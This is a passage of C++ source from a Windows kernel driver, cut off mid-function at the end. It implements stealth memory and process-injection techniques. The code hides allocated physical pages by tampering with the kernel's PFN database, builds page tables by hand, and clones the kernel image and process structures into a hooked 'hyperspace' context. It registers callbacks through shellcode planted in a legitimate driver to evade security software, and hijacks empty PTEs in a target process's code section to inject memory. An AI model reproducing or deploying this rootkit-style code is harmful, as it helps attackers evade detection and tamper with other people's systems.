      if (!page_table::spoof_pte_range(reinterpret_cast<uintptr_t>(target_address),
                                       globals::SHELL_SIZE, false)) {
        log("ERROR", "failed to spoof pte range for process callback");
        return STATUS_UNSUCCESSFUL;
      }

      // register the process callback using legit shellcode address
      NTSTATUS status = globals::ps_set_create_process_notify_routine_ex(
          reinterpret_cast<PCREATE_PROCESS_NOTIFY_ROUTINE_EX>(target_address), FALSE);

      if (NT_SUCCESS(status)) {
        InterlockedExchangePointer(&g_callback_shellcode_address, target_address);
        InterlockedExchangePointer(&g_process_callback_handle, target_address);
        log("SUCCESS", "registered process callback from legitimate driver section");
      } else {
        log("ERROR", "failed to register process callback: 0x%x", status);
      }

      return status;
    }
  }  // namespace callbacks

}  // namespace hyperspace
```

`driver/mem/hyperspace.hpp`:

```hpp
#pragma once

namespace hyperspace {

  extern ntoskrnl_mapping_info g_ntoskrnl_copy_info;
  extern pt_hook::hook_info g_pspexit_hook;

  /**
   * @brief Hook handler for PspExitThread to restore process context on thread
   * exit
   * @param a1 Thread exit parameter
   * @return Result from original PspExitThread function
   *
   * Intercepts thread exits in hyperspace context and restores the original
   * process references before calling the original function to prevent crashes
   * and maintain stability.
   */
  __int64 __fastcall PspExitThread(unsigned int a1);

  /**
   * @brief Initialize page tracking system for ntoskrnl copy operations
   * @return true if initialization succeeded, false otherwise
   *
   * Allocates memory for tracking physical pages used in ntoskrnl copying.
   * Maintains an array of allocated page addresses for proper cleanup.
   */
  auto initialize_page_tracking() -> bool;

  /**
   * @brief Add a virtual address to the page tracking array
   * @param va Virtual address of the allocated page
   * @return true if page was successfully tracked, false if array is full
   *
   * Records allocated pages for later cleanup. Essential for preventing memory
   * leaks when tearing down the hyperspace context.
   */
  auto add_tracked_page(uintptr_t va) -> bool;

  /**
   * @brief Locate ntoskrnl.exe in the loaded module list
   * @param base Output parameter for ntoskrnl base address
   * @param size Output parameter for ntoskrnl image size
   * @return true if ntoskrnl was found, false otherwise
   *
   * Searches PsLoadedModuleList to find the kernel image and retrieve its
   * base address and size for copying operations.
   */
  auto find_ntoskrnl_info(uintptr_t* base, uintptr_t* size) -> bool;

  /**
   * @brief Allocate and track a single physical page with hiding applied
   * @return Physical address of allocated page, or 0 on failure
   *
   * Combines page allocation, zeroing, physical address translation, and tracking
   * into a single operation for use in page table construction.
   */
  auto allocate_tracked_physical_page() -> uintptr_t;

  /**
   * @brief Copy ntoskrnl image to new physical pages using 4KB page granularity
   * @param src_base Source virtual address of ntoskrnl
   * @param size Size of ntoskrnl image in bytes
   * @param dest_pd_pa Physical address of destination page directory
   * @return true if copying succeeded, false otherwise
   *
   * Creates a complete physical copy of the kernel image using individual 4KB
   * pages with proper hiding techniques applied to each page.
   */
  auto copy_ntoskrnl_pages(uintptr_t src_base, uintptr_t size, uintptr_t dest_pd_pa) -> bool;

  /**
   * @brief Create page table hierarchy for ntoskrnl mapping in hyperspace
   * @param hyperspace_pml4_pa Physical address of hyperspace PML4
   * @param info Pointer to mapping information structure
   * @return true if page tables were created successfully, false otherwise
   *
   * Constructs PML4E->PDPTE->PDE hierarchy needed to map the copied ntoskrnl
   * at the same virtual address in hyperspace context.
   */
  auto create_ntoskrnl_page_tables(uintptr_t hyperspace_pml4_pa, ntoskrnl_mapping_info* info)
      -> bool;

  /**
   * @brief Map copied ntoskrnl pages into the hyperspace page tables
   * @param info Pointer to mapping information structure
   * @return true if mapping succeeded, false otherwise
   *
   * Creates PTEs pointing to the copied physical pages and constructs
   * complete virtual memory mapping for the ntoskrnl copy.
   */
  auto map_ntoskrnl_pages(ntoskrnl_mapping_info* info) -> bool;

  /**
   * @brief Install kernel function hooks within the hyperspace ntoskrnl copy
   * @return NTSTATUS indicating success or failure
   *
   * Applies function hooks to the copied kernel image in hyperspace context,
   * allowing for kernel-level interception without affecting the original kernel.
   */
  auto install_kernel_hooks_in_hyperspace() -> NTSTATUS;

  /**
   * @brief Create a complete contextualized copy of ntoskrnl in hyperspace
   * @return NTSTATUS indicating success or failure
   *
   * Master function that orchestrates the entire process of copying ntoskrnl
   * into hyperspace with proper page tables, mapping, and hook installation.
   */
  auto create_contextualized_ntoskrnl() -> NTSTATUS;

  /**
   * @brief Clean up and free all resources used by the ntoskrnl copy
   *
   * Releases all tracked pages, page table structures, and associated memory
   * allocated during ntoskrnl copying operations.
   */
  auto cleanup_contextualized_ntoskrnl() -> void;

  /**
   * @brief Initialize list entries in cloned EPROCESS to prevent crashes
   * @param clone_eproc Pointer to the cloned EPROCESS structure
   *
   * Sets up empty list heads and clears problematic fields to ensure the
   * cloned process structure doesn't cause system instability.
   */
  auto initialize_cloned_eprocess_lists(PEPROCESS clone_eproc) -> void;

  /**
   * @brief Locate PML4 self-reference entry in the original page table
   * @param cr3_pa Physical address of the original CR3/PML4
   * @return Structure containing self-reference entry information
   *
   * Finds the PML4 entry that points back to itself, which is used by
   * the system for recursive page table access.
   */
  auto find_pml4_self_reference_entry(uintptr_t cr3_pa) -> self_reference_entry_info;

  /**
   * @brief Update self-reference entry in cloned PML4 to point to new PML4
   * @param cloned_pml4_va Virtual address of cloned PML4
   * @param cloned_pml4_pa Physical address of cloned PML4
   * @param self_reference_info Information about the self-reference entry
   * @return true if update succeeded, false otherwise
   *
   * Modifies the self-reference entry to maintain proper recursive page table
   * access in the hyperspace context.
   */
  auto update_cloned_self_reference_entry(uintptr_t cloned_pml4_va, uintptr_t cloned_pml4_pa,
                                          self_reference_entry_info self_reference_info) -> bool;

  /**
   * @brief Copy page tables with proper self-reference entry handling
   * @param dest_pml4_va Virtual address of destination PML4
   * @param src_pml4_pa Physical address of source PML4
   * @param dest_pml4_pa Physical address of destination PML4
   * @param self_reference_info Output parameter for self-reference information
   * @return true if copying succeeded, false otherwise
   *
   * Performs a complete PML4 copy while properly handling and updating
   * the self-reference entry for the new context.
   */
  auto copy_page_tables_with_self_reference_entry(uintptr_t dest_pml4_va, uintptr_t src_pml4_pa,
                                                  uintptr_t dest_pml4_pa,
                                                  self_reference_entry_info* self_reference_info)
      -> bool;

  /**
   * @brief Initialize complete hyperspace context with cloned page tables
   * @param target_pid Process ID to create hyperspace context for
   * @param ctx Pointer to hyperspace context structure
   * @return NTSTATUS indicating success or failure
   *
   * Master initialization function that creates a complete hyperspace context
   * including cloned PML4, EPROCESS, and all necessary supporting structures.
   */
  auto initialize_hyperspace_context(uint32_t target_pid, hyperspace_ctx* ctx) -> NTSTATUS;

  /**
   * @brief Allocate memory within hyperspace context using unused PML4 entries
   * @param target_pid Target process ID (unused in current implementation)
   * @param size Size of memory to allocate
   * @param use_large_page Whether to use 2MB large pages
   * @return Virtual address of allocated memory, or nullptr on failure
   *
   * Allocates memory within the hyperspace context using the same stealth
   * techniques as regular allocation but within the isolated address space.
   */
  auto allocate_in_hyperspace(uint32_t target_pid, size_t size, memory_type mem_type) -> void*;

  /**
   * @brief Switch a thread's execution context to hyperspace
   * @param tid Thread ID to switch
   * @param ctx Pointer to hyperspace context
   * @return NTSTATUS indicating success or failure
   *
   * Modifies thread's ApcState.Process to point to the cloned EPROCESS,
   * effectively switching the thread to execute within hyperspace context.
   */
  auto switch_thread_context_to_hyperspace(uint32_t tid, hyperspace_ctx* ctx) -> NTSTATUS;

  /**
   * @brief Switch thread back from hyperspace to original context
   * @param tid Thread ID to switch back
   * @param ctx Pointer to hyperspace context
   * @return true if switch succeeded, false otherwise
   *
   * Restores thread's original process context, returning it to normal
   * execution environment.
   */
  auto switch_from_hyperspace(uint32_t tid, hyperspace_ctx* ctx) -> bool;

  /**
   * @brief Clean up hyperspace context and free all associated resources
   * @param ctx Pointer to hyperspace context to clean up
   *
   * Comprehensive cleanup function that releases PML4, EPROCESS clone,
   * and all other resources associated with the hyperspace context.
   */
  auto cleanup_hyperspace_context(hyperspace_ctx* ctx) -> void;

  namespace callbacks {

    extern void* g_callback_shellcode_address;
    extern void* g_process_callback_handle;

    /**
     * @brief Process notification callback implementation for cleanup on exit
     * @param ParentId Parent process ID
     * @param ProcessId Process ID that created/terminated
     * @param Create TRUE for process creation, FALSE for termination
     *
     * Handles process termination events to trigger automatic cleanup
     * of hyperspace resources when the target process exits.
     */
    auto process_notify_callback_impl(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create) -> void;

    /**
     * @brief Find a legitimate driver suitable for hosting callback shellcode
     * @param out_size Output parameter for driver size
     * @return Base address of suitable driver, or nullptr if none found
     *
     * Locates a legitimate system driver with proper flags for hosting
     * callback functions, avoiding detection by security software.
     */
    auto find_legitimate_driver_for_callbacks(PULONG out_size) -> void*;

    /**
     * @brief Install process notification callback for automatic cleanup
     * @return NTSTATUS indicating success or failure
     *
     * Registers a process notification callback using shellcode placed in
     * a legitimate driver to trigger cleanup when the target process exits.
     */
    auto install_process_callback() -> NTSTATUS;
  }  // namespace callbacks

}  // namespace hyperspace
```

`driver/mem/mem.cpp`:

```cpp
#pragma once
#include "../def/globals.hpp"
#include "phys.hpp"
#include "page_table.hpp"
#include "validation.hpp"
#include "../utils/raii.hpp"
namespace mem {

  /**
   * @brief Safely copy memory between virtual addresses within the current
   * process
   * @param dst Destination buffer
   * @param src Source buffer
   * @param size Number of bytes to copy
   * @return true if copy succeeded and all bytes were transferred, false
   * otherwise
   *
   * Uses MmCopyVirtualMemory for safe memory transfers.
   */
  bool safe_copy(void* const dst, void* const src, const size_t size) {
    SIZE_T bytes = 0;
    const auto current_process = globals::io_get_current_process();

    return globals::mm_copy_virtual_memory(current_process, src, current_process, dst, size,
                                           KernelMode, &bytes) == STATUS_SUCCESS &&
           bytes == size;
  }

  /**
   * @brief Validate user-mode address alignment and bounds
   * @param addr Address to validate
   * @param size Size of the memory region
   * @param alignment Required alignment (must be power of 2)
   * @return true if address is valid, false if invalid or out of bounds
   *
   * Checks if an address is properly aligned, within user-mode bounds, and
   * doesn't overflow.
   */
  auto probe_user_address(PVOID const addr, const SIZE_T size, const ULONG alignment) -> bool {
    if (size == 0) {
      return TRUE;
    }

    const auto current = reinterpret_cast<ULONG_PTR>(addr);

    if ((current & (alignment - 1)) != 0) {
      return false;
    }

    const auto last = current + size - 1;

    if ((last < current) || (last >= (uintptr_t)globals::mm_user_probe_address)) {
      return false;
    }

    return true;
  }

  /**
   * @brief Locate a loaded driver's base address by module name
   * @param module_name ANSI string name of the module to find
   * @return Base address of the module, or nullptr if not found
   *
   * Searches the PsLoadedModuleList to find a driver by name and returns its base
   * address.
   */
  auto get_driver_base(LPCSTR const module_name) -> void* {
    void* module_base = nullptr;

    UNICODE_STRING unicode_module_name;
    ANSI_STRING ansi_module_name;

    UNICODE_STRING routine_name;
    globals::rtl_init_unicode_string(&routine_name, L"PsLoadedModuleList");

    const auto module_list =
        static_cast<PLIST_ENTRY>(globals::mm_get_system_routine_address(&routine_name));
    auto current_entry = module_list->Flink;

    globals::rtl_init_ansi_string(&ansi_module_name, module_name);
    globals::rtl_ansi_string_to_unicode_string(&unicode_module_name, &ansi_module_name, TRUE);

    while (current_entry != module_list) {
      const auto data_table_entry =
          CONTAINING_RECORD(current_entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

      if (globals::rtl_compare_unicode_string(&data_table_entry->BaseDllName, &unicode_module_name,
                                              TRUE) == 0) {
        module_base = data_table_entry->DllBase;
        break;
      }

      current_entry = current_entry->Flink;
    }

    globals::rtl_free_unicode_string(&unicode_module_name);
    return module_base;
  }

  /**
   * @brief Apply stealth techniques to hide physical memory pages from detection
   * @param page_frame_number The PFN of the page to hide
   * @param type The hiding technique to apply
   * @return true if hiding succeeded, false otherwise
   *
   * Implements various memory hiding techniques via MmPfnDatabase manipulation
   */
  auto hide_physical_memory(uintptr_t page_frame_number, hide_type type, bool lock_page) -> bool {
    if (!validation::is_pfn_valid(page_frame_number)) {
      log("ERROR", "invalid PFN range: 0x%llx", page_frame_number);
      return false;
    }

    const auto pfn_entry_addr =
        *reinterpret_cast<uintptr_t*>(globals::mm_pfn_db) + 0x30 * (page_frame_number);

    auto* e1_field = reinterpret_cast<_MMPFNENTRY1*>(pfn_entry_addr + 0x22);
    auto* e3_field = reinterpret_cast<_MMPFNENTRY3*>(pfn_entry_addr + 0x23);
    auto* u2_field = reinterpret_cast<_MIPFNBLINK*>(pfn_entry_addr + 0x18);
    auto* active_field = reinterpret_cast<_MI_ACTIVE_PFN*>(pfn_entry_addr + 0x0);

    if (lock_page) {
      auto lock_result = globals::mi_lock_page_table_page(pfn_entry_addr, 3);
      if (!lock_result) {
        log("ERROR", "failed to lock page table page for PFN: 0x%llx", page_frame_number);
        return 0;
      }
    }

    switch (type) {
      case hide_type::NONE: {
        break;
      }
      case hide_type::PFN_EXISTS_BIT:  // returns 0xC0000141,
                                       // STATUS_INVALID_ADDRESS, The address
                                       // handle that was given to the transport
                                       // was invalid.
      {
        const auto PFN_EXISTS_BIT = (globals::build_version >= 22000) ? (1ULL << 54) : (1ULL << 50);

        auto* u4_field =
            reinterpret_cast<uint64_t*>(reinterpret_cast<uint8_t*>(pfn_entry_addr) + 0x28);

        *u4_field &= ~PFN_EXISTS_BIT;
        break;
      }

      case hide_type::MI_REMOVE_PHYSICAL_MEMORY:  // returns 0xC0000141,
                                                  // STATUS_INVALID_ADDRESS, The
                                                  // address handle that was given
                                                  // to the transport was invalid.
      {
        const auto FLAGS = globals::build_version >= 26100 ? 0x62 : 0x32;

        // removes PFN from MmPhysicalMemoryBlock
        NTSTATUS status = globals::mi_remove_physical_memory(page_frame_number, 1, FLAGS);
        if (!NT_SUCCESS(status)) {
          log("ERROR", "failed to remove physical memory on 0x%llx status 0x%X", page_frame_number,
              status);
          return false;
        }

        // nulls PFN entry for physical page
        globals::memset(reinterpret_cast<void*>(pfn_entry_addr), 0, 0x30);

        break;
      }
      case hide_type::SET_PARITY_ERROR: {
        // set ParityError, causes MmCopyMemory to return 0xC0000709
        // (STATUS_HARDWARE_MEMORY_ERROR) on the physical pages
        e3_field->ParityError = 1;

        break;
      }
      case hide_type::SET_LOCK_BIT: {
        // set LockBit, causes CPU to yield when MmCopyMemory is called on your
        // dll's physical address, think of this moreso as an anti-debug
        // mechanism. This can be used to see if your allocation is stealthy
        // enough.
        u2_field->LockBit = 1;

        break;
      }
      case hide_type::HIDE_TRANSLATION:  // this doesn't support driver pages yet
                                         // since I'm using
                                         // MmGetVirtualForPhysical for that lol,
                                         // I have to rewrite the driver hiding
                                         // function
      {
        PHYSICAL_ADDRESS physical_addr;
        physical_addr.QuadPart = PFN_TO_PAGE(page_frame_number);

        // log the virtual address before nulling MMPFN.PteAddress
        void* virtual_addr_before = globals::mm_get_virtual_for_physical(physical_addr);

        log("INFO",
            "MmGetVirtualForPhysical before nulling MMPFN.PteAddress: 0x%p for "
            "PFN "
            "0x%llx",
            virtual_addr_before, page_frame_number);

        // null MMPFN.PteAddress, this causes MmGetVirtualForPhysical to return
        // the wrong virtual address that's mapped by the PTE
        //
        // here's the pseudocode for MmGetVirtualForPhysical
        //
        // PVOID __stdcall MmGetVirtualForPhysical(PHYSICAL_ADDRESS
        // PhysicalAddress)
        // {
        //    return (PVOID)((PhysicalAddress.LowPart & 0xFFF)
        //        + ((__int64)(*(_QWORD*)(0x30 * ((unsigned
        //        __int64)PhysicalAddress.QuadPart >> 12) - 0x21FFFFFFFFF8LL) <<
        //        25)
        //        >> 16));
        // }
        //
        // pay attention specifically to *(_QWORD*)(0x30 * ((unsigned
        // __int64)PhysicalAddress.QuadPart >> 12) - 0x21FFFFFFFFF8LL). this is
        // accessing the MmPfnDatabase for this pfn, specifically the
        // PteAddress/PteLong union field. ideally you would want to spoof this
        // PteAddress/PteLong union field to look more legitimate by using another
        // pfn entry's PteAddress/PteLong union field, but in this case it will
        // just make MmGetVirtualForPhysical return 0 for this physical address

        // null MMPFN.PteAddress
        auto* pte_address = reinterpret_cast<uint64_t*>(pfn_entry_addr + 0x8);
        *pte_address = 0;

        // log the virtual address after nulling MMPFN.PteAddress
        void* virtual_addr_after = globals::mm_get_virtual_for_physical(physical_addr);
        log("INFO",
            "MmGetVirtualForPhysical after nulling MMPFN.PteAddress: 0x%p for "
            "PFN "
            "0x%llx",
            virtual_addr_after, page_frame_number);

        // verify the unlinking worked
        if (virtual_addr_after == nullptr || virtual_addr_after != virtual_addr_before) {
          log("SUCCESS", "successfully nulled MMPFN.PteAddress, phys to virt "
                         "translation has failed");
        } else {
          log("WARNING", "virtual address unchanged after nulling MMPFN.PteAddress "
                         "- operation may have failed");
        }

        break;
      }
    }

    return true;
  }

  /**
   * @brief Allocate independent physical pages with stealth hiding applied
   * @param size Size in bytes to allocate (will be page-aligned)
   * @return Virtual address of allocated memory, or nullptr on failure
   *
   * Allocates non-contiguous physical pages and applies configured hiding
   * techniques. Memory is hidden according to global settings.
   */
  auto allocate_independent_pages(size_t size) -> void* {
    void* base_address = globals::mm_allocate_independent_pages_ex(size, -1, 0, 0);
    if (!base_address) {
      log("ERROR", "failed to allocate independent page");
      return 0;
    }

    globals::memset(base_address, 0, size);

    uintptr_t pfn = page_table::virtual_to_physical(base_address).QuadPart >> PAGE_SHIFT;
    if (!pfn) {
      globals::mm_free_independent_pages(reinterpret_cast<uintptr_t>(base_address), size);
      log("ERROR", "failed to get pfn for page");
      return 0;
    }

    bool hide_status =
        mem::hide_physical_memory(pfn, static_cast<hide_type>(globals::dll_hide_type));
    if (!hide_status) {
      globals::mm_free_independent_pages(reinterpret_cast<uintptr_t>(base_address), size);
      log("ERROR", "failed to hide pfn for page");
      return 0;
    }

    return base_address;
  }

  /**
   * @brief Allocate secure kernel pages
   * @param size Size in bytes to allocate (will be page-aligned)
   * @return Virtual address of allocated memory, or nullptr on failure
   *
   */
  auto allocate_secure_kernel_pages(size_t size) -> void* {
    size_t page_count = (size + PAGE_SIZE - 1) / PAGE_SIZE;

    DWORD output_flag = 0;
    void* base_address = globals::mm_allocate_secure_kernel_pages(
        nullptr,      // Partition parameter (can be nullptr based on the code)
        page_count,   // Number of pages - reuse the function's page_count parameter
        0,            // Slab type (0 is a common default)
        0,            // Unused output parameter
        &output_flag  // Output flag
    );
    if (!base_address) {
      log("ERROR", "failed to allocate secure kernel page");
      return 0;
    }

    globals::memset(base_address, 0, size);

    return base_address;
  }

  /**
   * @brief Allocate contiguous physical memory with stealth hiding applied
   * @param size Size in bytes to allocate (will be page-aligned)
   * @return Virtual address of allocated memory, or nullptr on failure
   *
   * Allocates physically contiguous memory block and applies hiding techniques.
   * Handles both regular, large page and huge page allocations.
   */

  auto allocate_contiguous_memory(size_t size) -> void* {
    PHYSICAL_ADDRESS max_address{};
    max_address.QuadPart = ((ULONG64) ~((ULONG64)0));
    void* base_address = globals::mm_allocate_contiguous_memory(size, max_address);
    if (!base_address) {
      log("ERROR", "failed to allocate actual page");
      return 0;
    }
    globals::memset(base_address, 0, size);

    // determine memory type based on size
    memory_type mem_type;
    if (size == 0x40000000) {  // 1GB
      mem_type = memory_type::HUGE_PAGE;
    } else if (size == 0x200000) {  // 2MB
      mem_type = memory_type::LARGE_PAGE;
    } else {
      mem_type = memory_type::NORMAL_PAGE;
    }

    uintptr_t pfn =
        physical::get_page_frame_number(reinterpret_cast<uintptr_t>(base_address), mem_type);
    if (!pfn) {
      globals::mm_free_contiguous_memory(base_address);
      log("ERROR", "failed to get pfn for page");
      return 0;
    }

    bool hide_status =
        mem::hide_physical_memory(pfn, static_cast<hide_type>(globals::dll_hide_type));
    if (!hide_status) {
      globals::mm_free_contiguous_memory(base_address);
      log("ERROR", "failed to hide pfn for page");
      return 0;
    }

    const auto pfn_entry_addr = *reinterpret_cast<uintptr_t*>(globals::mm_pfn_db) + 0x30 * (pfn);

    // lock in physical memory
    auto lock_result = globals::mi_lock_page_table_page(pfn_entry_addr, 3);
    if (!lock_result) {
      log("ERROR", "failed to lock page table page for PFN: 0x%llx", pfn);
      return 0;
    }

    return base_address;
  }

  /**
   * @brief Manually construct page table entries for a virtual address range
   * @param target_dir_base Physical address of target process PML4
   * @param base_va Base virtual address to map
   * @param page_count Number of pages to map
   * @param mem_type Whether to use 4KB, 2MB or 1GB pages
   * @return NTSTATUS indicating success or failure
   *
   * Creates complete page table hierarchy (PML4E->PDPTE->PDE->PTE) for manual
   * memory mapping. Supports both 4KB,2MB and 1GB page sizes with proper cache
   * flushing after each page table modification to ensure coherency and locking to prevent paging
   * to disk.
   */
  auto write_page_tables(uintptr_t target_dir_base, uintptr_t base_va, size_t page_count,
                         memory_type mem_type) -> NTSTATUS {
    if (!target_dir_base || !page_count)
      return STATUS_INVALID_PARAMETER;

    // determine page size based on memory type
    const size_t PAGE_STEP = (mem_type == memory_type::HUGE_PAGE) ? 0x40000000 :  // 1GB
                                 (mem_type == memory_type::LARGE_PAGE) ? 0x200000
                                                                       :  // 2MB
                                 PAGE_SIZE;                               // 4KB

    for (size_t i = 0; i < page_count; ++i) {
      const auto va = base_va + i * PAGE_STEP;
      ADDRESS_TRANSLATION_HELPER h = {.AsUInt64 = va};

      // alloc actual page based on size
      void* page = nullptr;
      if (mem_type == memory_type::HUGE_PAGE) {
        page = mem::allocate_contiguous_memory(0x40000000);  // 1GB
      } else if (mem_type == memory_type::LARGE_PAGE) {
        page = mem::allocate_contiguous_memory(0x200000);  // 2MB
      } else {
        page = mem::allocate_independent_pages(PAGE_SIZE);  // 4KB
      }

      if (!page)
        return STATUS_INVALID_ADDRESS;

      auto pfn = physical::get_page_frame_number(reinterpret_cast<uintptr_t>(page), mem_type);
      if (!pfn)
        return STATUS_INVALID_ADDRESS;

      // helper to read/allocate table entry with cache flushing
      auto get_or_create_table = [](uintptr_t table_phys, uint16_t idx, auto& entry) -> uintptr_t {
        auto addr = table_phys + idx * sizeof(entry);
        physical::read_physical_address(addr, &entry, sizeof(entry));

        if (!entry.Present) {
          auto new_table = mem::allocate_independent_pages(PAGE_SIZE);
          if (!new_table)
            return 0;

          entry = {0};
          entry.Flags = 0;
          entry.Present = 1;
          entry.Write = 1;
          entry.Supervisor = 1;
          entry.ExecuteDisable = 0;
          entry.PageFrameNumber = PAGE_TO_PFN(page_table::virtual_to_physical(new_table).QuadPart);

          // write the entry
          if (!NT_SUCCESS(physical::write_physical_address(addr, &entry, sizeof(entry)))) {
            log("ERROR", "failed to write physical address at page table: 0x%llx", addr);
            return 0;
          };

          const auto pfn_entry_addr =
              *reinterpret_cast<uintptr_t*>(globals::mm_pfn_db) + 0x30 * (entry.PageFrameNumber);

          // lock in physical memory
          auto lock_result = globals::mi_lock_page_table_page(pfn_entry_addr, 3);
          if (!lock_result) {
            log("ERROR", "failed to lock page table page for PFN: 0x%llx", entry.PageFrameNumber);
            return 0;
          }

          // flush caches
          page_table::flush_caches(new_table);
          log("INFO", "created and flushed new page table at 0x%llx (entry addr: 0x%llx)",
              reinterpret_cast<uintptr_t>(new_table), addr);
        }

        return PFN_TO_PAGE(entry.PageFrameNumber);
      };

      log("INFO", "processing VA: 0x%llx (page %zu/%zu, type: %s)", va, i + 1, page_count,
          mem_type == memory_type::HUGE_PAGE    ? "1GB"
          : mem_type == memory_type::LARGE_PAGE ? "2MB"
                                                : "4KB");

      // PML4E -> PDPTE
      PML4E_64 pml4e;
      auto pdpt_phys = get_or_create_table(target_dir_base, h.AsIndex.Pml4, pml4e);
      if (!pdpt_phys)
        return STATUS_INVALID_ADDRESS;

      if (mem_type == memory_type::HUGE_PAGE) {
        // create 1GB huge page entry at PDPTE level
        PDPTE_1GB_64 pdpte = {0};
        pdpte.Flags = 0;
        pdpte.Present = 1;
        pdpte.Write = 1;
        pdpte.Supervisor = 1;
        pdpte.LargePage = 1;
        pdpte.ExecuteDisable = 0;
        pdpte.PageFrameNumber = pfn;

        auto pdpte_addr = pdpt_phys + h.AsIndex.Pdpt * sizeof(pdpte);
        physical::write_physical_address(pdpte_addr, &pdpte, sizeof(pdpte));

        page_table::flush_caches(page);
        log("INFO", "created 1GB huge page PDPTE at 0x%llx", pdpte_addr);
        continue;  // skip PDE and PTE levels for 1GB pages
      }

      // PDPTE -> PDE (for 2MB and 4KB pages)
      PDPTE_64 pdpte;
      auto pd_phys = get_or_create_table(pdpt_phys, h.AsIndex.Pdpt, pdpte);
      if (!pd_phys)
        return STATUS_INVALID_ADDRESS;

      if (mem_type == memory_type::LARGE_PAGE) {
        // create 2MB large page entry
        PDE_2MB_64 pde = {0};
        pde.Flags = 0;
        pde.Present = 1;
        pde.Write = 1;
        pde.Supervisor = 1;
        pde.LargePage = 1;
        pde.ExecuteDisable = 0;
        pde.PageFrameNumber = pfn;

        auto pde_addr = pd_phys + h.AsIndex.Pd * sizeof(pde);
        physical::write_physical_address(pde_addr, &pde, sizeof(pde));

        page_table::flush_caches(page);

        log("INFO", "created 2MB large page PDE at 0x%llx", pde_addr);
      } else {
        // PDE -> PTE for 4KB pages
        PDE_64 pde;
        auto pt_phys = get_or_create_table(pd_phys, h.AsIndex.Pd, pde);
        if (!pt_phys)
          return STATUS_INVALID_ADDRESS;

        // create 4KB page entry
        PTE_64 pte = {0};
        pte.Flags = 0;
        pte.Present = 1;
        pte.Write = 1;
        pte.Supervisor = 1;
        pte.ExecuteDisable = 0;
        pte.PageFrameNumber = pfn;

        auto pte_addr = pt_phys + h.AsIndex.Pt * sizeof(pte);
        physical::write_physical_address(pte_addr, &pte, sizeof(pte));

        page_table::flush_caches(page);
        log("INFO", "created 4KB page PTE at 0x%llx", pte_addr);
      }
    }

    log("SUCCESS", "completed page table creation for %zu pages of type %s", page_count,
        mem_type == memory_type::HUGE_PAGE    ? "1GB"
        : mem_type == memory_type::LARGE_PAGE ? "2MB"
                                              : "4KB");

    return STATUS_SUCCESS;
  }
  /**
   * @brief Hijack null/empty PTEs within a process's .text section
   * @param local_pid Current process ID (unused)
   * @param target_pid Target process ID to inject into
   * @param size Size of memory region needed
   * @return Virtual address in target process, or nullptr on failure
   *
   * Scans the target process's main module .text section for PTEs with null page
   * frame numbers and replaces them with hidden physical pages. Dangerous
   * technique that may cause instability.
   */
  auto hijack_null_pfn(const uint32_t local_pid, const uint32_t target_pid, const size_t size)
      -> void* {
    const size_t page_mask = PAGE_SIZE - 1;
    const size_t aligned_size = (size + page_mask) & ~page_mask;
    const size_t page_count = aligned_size >> PAGE_SHIFT;

    log("INFO", "searching for space of size 0x%llx (%d pages) within .text section", aligned_size,
        page_count);

    PEPROCESS target_process = nullptr;
    if (globals::ps_lookup_process_by_process_id(reinterpret_cast<HANDLE>(target_pid),
                                                 &target_process) != STATUS_SUCCESS) {
      log("ERROR", "failed to lookup target process");
      return nullptr;
    }

    // RAII will handle cleanup
    raii::process_ref process_ref(target_process, "EPROCESS");

    const auto target_dir_base = physical::get_process_directory_base(target_process);
    if (!target_dir_base) {
      log("ERROR", "failed to lookup target process directory base");
      return nullptr;
    }

    PPEB peb_address = globals::ps_get_process_peb(target_process);
    if (!peb_address) {
      log("ERROR", "failed to get PEB address");
      return nullptr;
    }

    PEB peb;
    physical::read_process_memory(target_process, reinterpret_cast<uintptr_t>(peb_address), &peb,
                                  sizeof(PEB));
    log("INFO", "PEB found at 0x%llx", peb_address);

    PEB_LDR_DATA ldr_data;
    physical::read_process_memory(target_process, reinterpret_cast<uintptr_t>(peb.Ldr), &ldr_data,
                                  sizeof(PEB_LDR_DATA));

    LDR_DATA_TABLE_ENTRY main_module;
    physical::read_process_memory(
        target_process,
        reinterpret_cast<uintptr_t>(CONTAINING_RECORD(ldr_data.InMemoryOrderModuleList.Flink,
                                                      LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)),
        &main_module, sizeof(LDR_DATA_TABLE_ENTRY));

    uintptr_t module_base = reinterpret_cast<uintptr_t>(main_module.DllBase);

    IMAGE_DOS_HEADER dos_header;
    physical::read_process_memory(target_process, module_base, &dos_header,
                                  sizeof(IMAGE_DOS_HEADER));

    if (dos_header.e_magic != IMAGE_DOS_SIGNATURE) {
      log("ERROR", "invalid DOS header signature");
      return nullptr;
    }

    IMAGE_NT_HEADERS nt_headers;
    physical::read_process_memory(target_process, module_base + dos_header.e_lfanew, &nt_headers,
                                  sizeof(IMAGE_NT_HEADERS));

    if (nt_headers.Signature != IMAGE_NT_SIGNATURE) {
      log("ERROR", "invalid NT header signature");
      return nullptr;
    }

    uintptr_t section_header_addr = module_base + dos_header.e_lfanew +
                                    FIELD_OFFSET(IMAGE_NT_HEADERS, OptionalHeader) +
                                    nt_headers.FileHeader.SizeOfOptionalHeader;

    bool found_text_section = false;
    uintptr_t text_section_start = 0;
    uintptr_t text_section_end = 0;

    for (WORD i = 0; i < nt_headers.FileHeader.NumberOfSections; i++) {
      IMAGE_SECTION_HEADER section_header;
      physical::read_process_memory(target_process,
                                    section_header_addr + (i * sizeof(IMAGE_SECTION_HEADER)),
                                    &section_header, sizeof(IMAGE_SECTION_HEADER));

      if (globals::memcmp(section_header.Name, ".text", 5) == 0 ||
          globals::memcmp(section_header.Name, "CODE", 4) == 0) {
        text_section_start = module_base + section_header.VirtualAddress;
        text_section_end = text_section_start + section_header.Misc.VirtualSize;
        found_text_section = true;

        log("INFO", "found .text section at 0x%llx - 0x%llx", text_section_start, text_section_end);
        break;
      }
    }

    if (!found_text_section) {
      log("ERROR", "could not find .text section in main module");
      return nullptr;
    }

    text_section_start &= ~(PAGE_SIZE - 1);
    text_section_end = (text_section_end + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);

    log("INFO", "scanning .text section range (page-aligned): 0x%llx - 0x%llx", text_section_start,
        text_section_end);

    uintptr_t base_va = 0;
    uintptr_t pml4_phys = target_dir_base;

    // Scan for null PTEs (existing logic remains the same)
    for (uintptr_t current_va = text_section_start; current_va < text_section_end;
         current_va += PAGE_SIZE) {
      ADDRESS_TRANSLATION_HELPER helper;
      helper.AsUInt64 = current_va;

      PML4E_64 pml4e = {0};
